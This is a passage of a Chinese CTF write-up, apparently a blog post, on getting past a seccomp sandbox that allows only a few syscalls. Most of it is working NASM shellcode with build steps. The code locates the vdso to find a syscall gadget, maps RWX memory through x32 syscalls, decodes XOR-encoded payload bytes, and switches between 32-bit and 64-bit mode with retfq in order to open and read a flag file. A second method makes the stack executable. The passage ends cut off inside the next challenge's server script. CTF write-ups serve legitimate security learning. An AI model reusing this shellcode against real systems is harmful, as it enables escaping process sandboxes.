class="hljs-number">0021</span><br><span class="hljs-number">0005</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x0f</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x000000e7</span>  <span class="hljs-keyword">if</span> (A == exit_group) <span class="hljs-keyword">goto</span> <span class="hljs-number">0021</span><br><span class="hljs-number">0006</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x0e</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x40000001</span>  <span class="hljs-keyword">if</span> (A == x32_write) <span class="hljs-keyword">goto</span> <span class="hljs-number">0021</span><br><span class="hljs-number">0007</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x0d</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x40000009</span>  <span class="hljs-keyword">if</span> (A == x32_mmap) <span class="hljs-keyword">goto</span> <span class="hljs-number">0021</span><br><span class="hljs-number">0008</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x0c</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x4000000b</span>  <span class="hljs-keyword">if</span> (A == x32_munmap) <span class="hljs-keyword">goto</span> <span class="hljs-number">0021</span><br><span class="hljs-number">0009</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0c</span> <span class="hljs-number">0x0000003b</span>  <span class="hljs-keyword">if</span> (A != execve) <span class="hljs-keyword">goto</span> <span class="hljs-number">0022</span><br><span class="hljs-number">0010</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000014</span>  A = filename &gt;&gt; <span class="hljs-number">32</span> <span class="hljs-meta"># execve(filename, argv, envp)</span><br><span class="hljs-number">0011</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0a</span> <span class="hljs-number">0x00007fff</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0x7fff</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0022</span><br><span class="hljs-number">0012</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000010</span>  A = filename <span class="hljs-meta"># execve(filename, argv, envp)</span><br><span class="hljs-number">0013</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x07</span> <span class="hljs-number">0x08</span> <span class="hljs-number">0xffffefe5</span>  <span class="hljs-keyword">if</span> (A == <span class="hljs-number">0xffffefe5</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0021</span> <span class="hljs-keyword">else</span> <span class="hljs-keyword">goto</span> <span class="hljs-number">0022</span><br><span class="hljs-number">0014</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x07</span> <span class="hljs-number">0x40000003</span>  <span class="hljs-keyword">if</span> (A != ARCH_I386) <span class="hljs-keyword">goto</span> <span class="hljs-number">0022</span><br><span class="hljs-number">0015</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number<br><span class="hljs-number">0016</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x04</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000001</span>  <span class="hljs-keyword">if</span> (A == write) <span class="hljs-keyword">goto</span> <span class="hljs-number">0021</span> ; <span class="hljs-built_in">exit</span><br><span class="hljs-number">0017</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x03</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000006</span>  <span class="hljs-keyword">if</span> (A == lstat) <span class="hljs-keyword">goto</span> <span class="hljs-number">0021</span> ; close<br><span class="hljs-number">0018</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x03</span> <span class="hljs-number">0x00000005</span>  <span class="hljs-keyword">if</span> (A != fstat) <span class="hljs-keyword">goto</span> <span class="hljs-number">0022</span> ; open<br><span class="hljs-number">0019</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000018</span>  A = statbuf <span class="hljs-meta"># fstat(fd, statbuf)</span><br><span class="hljs-number">0020</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0x0</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0022</span><br><span class="hljs-number">0021</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW<br><span class="hljs-number">0022</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">return</span> KILL<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>64位：允许read，x32_write，x32_mmap</li>
+<li>32位：允许open</li>
+</ul>
+<p><em>主要问题是怎么造syscall</em></p>
+<h3 id="vdso"><a href="#vdso" class="headerlink" title="vdso"></a>vdso</h3><p>虽然只能加载静态链接ELF但vsdo还是会加载进内存，且rx权限的vdso中是有syscall的</p>
+<p>先放ELF再慢慢解释</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs assembly">; compile with: nasm -felf64 exp.s &amp;&amp; ld -N exp.o &amp;&amp; strip -s ./a.out<br>; ld -N will put all segment together (make file much smaller), <br>; but will create RWX segment<br>; use 010 editor to modify segment header, mark it as RX<br><br>global    _start<br>section   .text<br><br>_start:<br>    mov rdi, rsp<br>; find vdso address on stack<br>find_vdso_l1:<br>    cmp    QWORD [rdi],0x21<br>    je     find_vdso_l2<br>    add    rdi,0x8<br>    jmp    find_vdso_l1<br>find_vdso_l2: <br>    mov    rax, QWORD [rdi+0x8] ; rax store vdso ptr<br>; search for `syscall; ret` in vdso<br>find_syscall_ret_l1:<br>    cmp    BYTE [rax],0xf<br>    jne    find_syscall_ret_l2<br>    cmp    BYTE [rax+0x1],0x5<br>    jne    find_syscall_ret_l2<br>    cmp    BYTE [rax+0x2],0xc3<br>    je     find_syscall_ret_l3<br>find_syscall_ret_l2:<br>    inc    rax<br>    jmp    find_syscall_ret_l1<br>find_syscall_ret_l3:<br>    mov r15, rax<br>mmap_32bit_stack:<br>    mov eax, 0x40000009<br>    mov edi, 0x19260000-0x1000<br>    mov esi, 0x2000<br>    mov edx, 7<br>    mov r10, 0x22<br>    mov r8, 0<br>    mov r9, 0<br>    call r15 ; call syscall<br>    ; mmap_x32(0x19260000-0x1000, 0x2000, RWX, MAP_ANONYMOUS | MAP_PRIVATE, 0, 0)<br>mmap_32bit_shellcode:<br>    mov eax, 0x40000009<br>    mov edi, 0x19290000<br>    mov esi, 0x2000<br>    mov edx, 7<br>    mov r10, 0x22<br>    mov r8, 0<br>    mov r9, 0<br>    call r15 ; call syscall<br>    ; mmap_x32(0x19290000, 0x2000, RWX, MAP_ANONYMOUS | MAP_PRIVATE, 0, 0)<br><br>xor_shellcode_l1:<br>    xor    eax,eax<br>    lea    rdi,[sc]<br>    mov    rsi,0x19290000<br>    mov    rdx,QWORD [sc_len]<br>xor_shellcode_l2:<br>    cmp    rdx,rax<br>    je     jump_to_shellcode<br>    mov    cl,BYTE [rdi+rax*1]<br>    xor    ecx,0x1<br>    mov    BYTE [rsi+rax*1],cl<br>    inc    rax<br>    jmp    xor_shellcode_l2<br><br>jump_to_shellcode:<br>    mov rsp, 0x19260000<br>    mov rax, 0x19290000<br>    jmp rax<br><br>; message:  db        &quot;test output!!!!!&quot;, 0      ; note the newline at the end<br>sc:       db        0xbd, 0x1, 0x4, 0x27, 0x18, 0x6b, 0x22, 0x69, 0xf, 0x1, 0x28, 0x18, 0x49, 0xca, 0xb9, 0x4, 0x1, 0x1, 0x1, 0x6b, 0x66, 0x69, 0x2e, 0x67, 0x6d, 0x60, 0x88, 0xe2, 0x30, 0xc8, 0xcc, 0x81, 0x6b, 0x32, 0x69, 0x28, 0x1, 0x28, 0x18, 0x49, 0xca, 0x30, 0xc1, 0xbe, 0x2, 0x1, 0x1, 0x1, 0xbf, 0x1, 0x9, 0x27, 0x18, 0xbb, 0x1, 0x0, 0x1, 0x1, 0xe, 0x4, 0xb9, 0x0, 0x1, 0x1, 0x41, 0xbe, 0x0, 0x1, 0x1, 0x1, 0xbf, 0x1, 0x9, 0x27, 0x18, 0xbb, 0x1, 0x0, 0x1, 0x1, 0xe, 0x4, 0x6b, 0x22, 0x69, 0x5a, 0x1, 0x28, 0x18, 0x49, 0xca, 0xb9, 0x0, 0x1, 0x1, 0x1, 0xba, 0x88, 0x1, 0x1, 0x1, 0xcc, 0x81<br>sc_len:   dq        103<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><p>栈上会有vsdo的基址，在envp之后的auxv数组中，AT_SYSINFO_EHDR（0x21）项就是vdso的地址</p>
+<img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/stack.png" srcset="/img/loading.gif" lazyload class title="stack">
+
+<img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/vdso.png" srcset="/img/loading.gif" lazyload class title="vdso">
+</li>
+<li><p>然后就在vdso中搜索syscall</p>
+<img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/syscallret.png" srcset="/img/loading.gif" lazyload class title="syscallret">
+</li>
+<li><p>32位mmap一段内存，用作stack（0x40000000以上的系统调用号是64位下执行32位系统调用）</p>
+<p>由于之后要转换成32位，需要栈高8字节为0，所以要重新mmap一段栈</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">mmap_x32(<span class="hljs-number">0x19260000</span><span class="hljs-number">-0x1000</span>, <span class="hljs-number">0x2000</span>, RWX, MAP_ANONYMOUS | MAP_PRIVATE, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>
+
+<img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/mmap32.png" srcset="/img/loading.gif" lazyload class title="mmap32 % } {% asset_img mmap1.png mmap1">
+</li>
+<li><p>再mmap一段内存，用于写shellcode</p>
+<img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/mmap2.png" srcset="/img/loading.gif" lazyload class title="mmap2">
+</li>
+<li><p>将要执行的shellcode解码赋值至0x19290000</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs assembly">section .text<br>    global _start<br><br>_start:<br>    ; mov eax, 0x40000009<br>    ; ; mov eax, 0x9<br>    ; mov edi, 0x19260000<br>    ; mov esi, 0x1000<br>    ; mov edx, 0x7<br>    ; mov r10d, 0x22<br>    ; mov r8d, -1<br>    ; mov r9d, 0<br>    ; syscall<br><br>    mov rsp, 0x19260500<br>    push 0x23 ; CS<br>    push 0x1929000e ; _open<br>    retfq<br><br>_open:<br>    mov eax, 5<br>    push 0x0067<br>    push 0x616c662f ; /flag<br>    mov ebx, esp<br>    xor ecx, ecx<br>    int 0x80<br><br>    push 0x33 ; CS<br>    push 0x19290029 ; _read<br>    retfq<br><br>_read:<br>    xor eax, eax<br>    mov rdi, 3<br>    mov rsi, 0x19260800<br>    mov rdx, 0x100<br>    syscall<br><br>_write:<br>    mov rax, 0x40000001<br>    mov rdi, 1<br>    mov rsi, 0x19260800<br>    mov rdx, 0x100<br>    syscall<br><br>    push 0x23 ; CS<br>    push 0x1929005b ; _exit<br>    retfq<br><br>_exit:<br>    mov eax, 1<br>    mov ebx, 137<br>    int 0x80<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><p>open需要32位</p>
+<ul>
+<li>可以使用retfq（相当于pop rip; pop cs;）切换架构（32位架构cs为0x23）</li>
+<li>或者直接64位下直接int 0x80，需要保证栈和返回地址高32位为0</li>
+<li><strong>注意int 0x80传参：ebx，ecx，edx，esi，edi</strong></li>
+</ul>
+<img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/open.png" srcset="/img/loading.gif" lazyload class title="open">
+</li>
+<li><p>然后正常64位read，x32_write</p>
+<img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/read.png" srcset="/img/loading.gif" lazyload class title="read">
+
+<img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/write.png" srcset="/img/loading.gif" lazyload class title="write"></li>
+</ul>
+</li>
+</ul>
+<h3 id="GNU-STACK"><a href="#GNU-STACK" class="headerlink" title="GNU_STACK"></a>GNU_STACK</h3><p>修改GNU_STACK p_flags 为X，栈默认可读写，由于内核实现原因此时栈是rwx的</p>
+<p>分了三段shellcode</p>
+<ul>
+<li><p>shellcode1（exp）把shellcode2（sc_mmap）拷贝到栈上，解码并执行之</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs assembly">global    _start<br>section   .text<br><br>_start:<br>    sub rsp,0x100<br>xor_shellcode_mmap_l1:<br>    xor    eax,eax<br>    lea    rdi,[sc_mmap]<br>    mov    rsi,rsp<br>    mov    rdx,QWORD [scm_len]<br>xor_shellcode_mmap_l2:<br>    cmp    rdx,rax<br>    je     jump_to_shellcode<br>    mov    cl,BYTE [rdi+rax*1]<br>    xor    ecx,0x1<br>    mov    BYTE [rsi+rax*1],cl<br>    inc    rax<br>    jmp    xor_shellcode_mmap_l2<br><br>jump_to_shellcode:<br>    jmp rsp<br><br>; message:  db        &quot;test output!!!!!&quot;, 0      ; note the newline at the end<br>sc:	    db        185, 4, 1, 1, 1, 73, 191, 46, 103, 109, 96, 102, 1, 1, 1, 87, 136, 226, 48, 200, 204, 129, 48, 193, 190, 2, 1, 1, 1, 191, 1, 9, 39, 24, 187, 1, 0, 1, 1, 14, 4, 185, 0, 1, 1, 65, 190, 0, 1, 1, 1, 191, 1, 9, 39, 24, 187, 1, 0, 1, 1, 14, 4, 185, 0, 1, 1, 1, 186, 136, 1, 1, 1, 204, 129, 1, 47, 114, 105, 114, 117<br>sc_len:     dq        81<br>sc_mmap:    db        185, 8, 1, 1, 65, 190, 1, 241, 36, 24, 191, 1, 33, 1, 1, 187, 6, 1, 1, 1, 64, 187, 35, 1, 1, 1, 64, 185, 1, 1, 1, 1, 64, 184, 1, 1, 1, 1, 14, 4, 185, 8, 1, 1, 65, 190, 1, 1, 40, 24, 191, 1, 33, 1, 1, 187, 6, 1, 1, 1, 64, 187, 35, 1, 1, 1, 64, 185, 1, 1, 1, 1, 64, 184, 1, 1, 1, 1, 14, 4, 48, 193, 73, 140, 61, 36, 48, 17, 65, 1, 191, 1, 1, 40, 24, 187, 75, 1, 1, 1, 73, 56, 195, 117, 15, 139, 13, 6, 130, 240, 0, 137, 13, 7, 73, 254, 193, 234, 236, 189, 1, 1, 39, 24, 185, 1, 1, 40, 24, 254, 225, 1, 1, 1, 1, 1, 1<br>scm_len:    dq        137<br></code></pre></td></tr></table></figure>
+
+<img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/jmprsp.png" srcset="/img/loading.gif" lazyload class title="jmprsp">
+
+<p>链接带stack的elf使用以下命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ld -o exp -z execstack exp.o<br></code></pre></td></tr></table></figure>
+
+<p>这样的stack是rwx的，需要010editor改一下权限</p>
+<img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/editor.png" srcset="/img/loading.gif" lazyload class title="editor">
+</li>
+<li><p>shellcode2（sc_mmap）mmap两段内存，将shellcode3（sc）复制过去，执行之</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs assembly">section .text<br>    global _start<br><br>_start:<br>mmap_32bit_stack:<br>    mov eax, 0x40000009<br>    mov edi, 0x19260000-0x1000<br>    mov esi, 0x2000<br>    mov edx, 7<br>    mov r10, 0x22<br>    mov r8, 0<br>    mov r9, 0<br>    syscall ; call syscall<br>    ; mmap_x32(0x19260000-0x1000, 0x2000, RWX, MAP_ANONYMOUS | MAP_PRIVATE, 0, 0)<br>mmap_32bit_shellcode:<br>    mov eax, 0x40000009<br>    mov edi, 0x19290000<br>    mov esi, 0x2000<br>    mov edx, 7<br>    mov r10, 0x22<br>    mov r8, 0<br>    mov r9, 0<br>    syscall ; call syscall<br>    ; mmap_x32(0x19290000, 0x2000, RWX, MAP_ANONYMOUS | MAP_PRIVATE, 0, 0)<br>xor_shellcode_l1:<br>    xor    eax,eax<br>    lea    rdi,0x401031<br>    mov    rsi,0x19290000<br>    mov    rdx,80<br>xor_shellcode_l2:<br>    cmp    rdx,rax<br>    je     jump_to_shellcode<br>    mov    cl,BYTE [rdi+rax*1]<br>    xor    ecx,0x1<br>    mov    BYTE [rsi+rax*1],cl<br>    inc    rax<br>    jmp    xor_shellcode_l2<br><br>jump_to_shellcode:<br>    mov rsp, 0x19260000<br>    mov rax, 0x19290000<br>    jmp rax<br></code></pre></td></tr></table></figure>
+
+<img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/jmpshellcode.png" srcset="/img/loading.gif" lazyload class title="jmpshellcode">
+</li>
+<li><p>shellcode3（sc）进行orw</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c">section .text<br>    global _start<br><br>_start:<br>_open:<br>    mov eax, <span class="hljs-number">5</span><br>    mov rsi, <span class="hljs-number">0x0067616c662f</span><br>    push rsi ; /flag<br>    mov ebx, esp<br>    xor ecx, ecx<br>    <span class="hljs-type">int</span> <span class="hljs-number">0x80</span><br><br>_read:<br>    xor eax, eax<br>    mov rdi, <span class="hljs-number">3</span><br>    mov rsi, <span class="hljs-number">0x19260800</span><br>    mov rdx, <span class="hljs-number">0x100</span><br>    syscall<br><br>_write:<br>    mov rax, <span class="hljs-number">0x40000001</span><br>    mov rdi, <span class="hljs-number">1</span><br>    mov rsi, <span class="hljs-number">0x19260800</span><br>    mov rdx, <span class="hljs-number">0x100</span><br>    syscall<br><br>_exit:<br>    mov eax, <span class="hljs-number">1</span><br>    mov ebx, <span class="hljs-number">137</span><br>    <span class="hljs-type">int</span> <span class="hljs-number">0x80</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>ps：vdso的shellcode写入flag字符串时是两个push，这是已经切换32位了，一次push是四字节，64位push两次就变成 &#x2F;fla 了(╯‵□′)╯︵┻━┻，就这个bug de了好久……</strong></p>
+</li>
+</ul>
+<h1 id="2023-0CTF-nothing"><a href="#2023-0CTF-nothing" class="headerlink" title="2023 0CTF nothing"></a>2023 0CTF nothing</h1><h2 id="server-py-1"><a href="#server-py-1" class="headerlink" title="server.py"></a>server.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3 -u</span><br><br><span class="hljs-keyword">import</span> os, sys, random, subprocess, gmpy2<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha3_256<br><span class="hljs-keyword">from</span> elftools.elf.elffile <span class="hljs-keyword">import</span> ELFFile<br><span class="hljs-keyword">from</span> elftools.elf.constants <span class="hljs-keyword">import</span> P_FLAGS<br><br>os.chdir(os.path.dirname(__file__))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">proof_of_work</span>(<span class="hljs-params">sec = <span class="hljs-number">10</span></span>):<br>    <span class="hljs-comment"># From 0CTF/TCTF 2021</span><br>    p = gmpy2.next_prime(random.getrandbits(<span class="hljs-number">512</span>))<br>    q = gmpy2.next_prime(random.getrandbits(<span class="hljs-number">512</span>))<br>    n = p*q<br>    c = <span class="hljs-number">2900000</span><br>    t = c*sec + random.randint(<span class="hljs-number">0</span>,c)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Show me your computation:&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;2^(2^<span class="hljs-subst">&#123;t&#125;</span>) mod <span class="hljs-subst">&#123;n&#125;</span> = ?&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Your answer: &#x27;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        sol = <span class="hljs-built_in">int</span>(sys.stdin.readline())<br>        phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>        u = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, t, phi)<br>        w = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, u, n)<br>        <span class="hljs-keyword">if</span> w == sol:<br>            <span 